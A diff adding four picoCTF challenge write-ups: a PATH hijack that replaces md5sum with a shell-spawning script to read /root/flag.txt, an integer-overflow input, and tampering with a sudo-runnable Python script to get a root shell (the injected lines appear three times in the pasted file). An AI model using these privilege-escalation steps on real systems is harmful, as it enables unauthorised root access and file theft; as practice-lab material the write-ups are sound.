@@ -762,4 +762,136 @@ We get the username and password
 Entering the username and password gives us the flag.
 
 
+## hash-only-1
+
+After loggin in we can see the terminal.
+
+We can bypass and read the flag
+
+```
+echo '#!/bin/bash' > md5sum
+echo '/bin/sh' >> md5sum
+chmod +x md5sum
+export PATH=.:$PATH
+./flaghasher
+```
+
+Now it gives you a # Terminal
+type 
+```
+cat /root/flag.txt
+```
+
+
+## hash-only-2
+
+After loggin in we can see the terminal.
+
+We can bypass and read the flag
+
+Since we dont have permissing to run any thing we open anything here we use bash to open a new shell
+
+```
+bash
+```
+
+```
+echo '#!/bin/bash' > md5sum
+echo '/bin/sh' >> md5sum
+chmod +x md5sum
+export PATH=.:$PATH
+flaghasher
+```
+
+Now it gives you a # Terminal
+type 
+```
+cat /root/flag.txt
+```
+
+
+## two-sum
+
+You have to cause Integer overflow
+so enter
+
+```
+2147483647 1
+```
+
+It will overflow
+
+
+## hijacking
+
+The files are hidden
+
+```
+ls -la
+```
+vi works
+```
+vi /home/picoctf/.server.py
+```
+
+Add this at the beginning
+
+```
+import os
+os.setuid(0)  # Change the user ID to root
+os.system('/bin/bash')  # Execute a shell as root
+```
+
+It should be like this
+```
+picoctf@challenge:~$ cat .server.py
+import base64
+import os
+import socket
+import os
+os.setuid(0)  # Change the user ID to root
+os.system('/bin/bash')  # Execute a shell as root
+ip = 'picoctf.org'
+response = os.system("ping -c 1 " + ip)
+#saving ping details to a variable
+host_info = socket.gethostbyaddr(ip)
+#getting IP from a domaine
+host_info_to_str = str(host_info[2])
+host_info = base64.b64encode(host_info_to_str.encode('ascii'))
+import os
+os.setuid(0)  # Change the user ID to root
+os.system('/bin/bash')  # Execute a shell as root
+import os
+os.setuid(0)  # Change the user ID to root
+os.system('/bin/bash')  # Execute a shell as root
+print("Hello, this is a part of information gathering",'Host: ', host_info)
+```
+
+Adding at the end doesnt work as the code fails getting serverhost
+
+```
+sudo -l 
+```
+
+Gives 
+```
+Matching Defaults entries for picoctf on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoctf may run the following commands on challenge:
+    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
+```
+
+
+Now we are root so we can go to `/root`
+and then `ls -la` and read the flag
+
+```
+cd /root
+ls -la
+cat .flag.txt
+```
+
+
 ## 
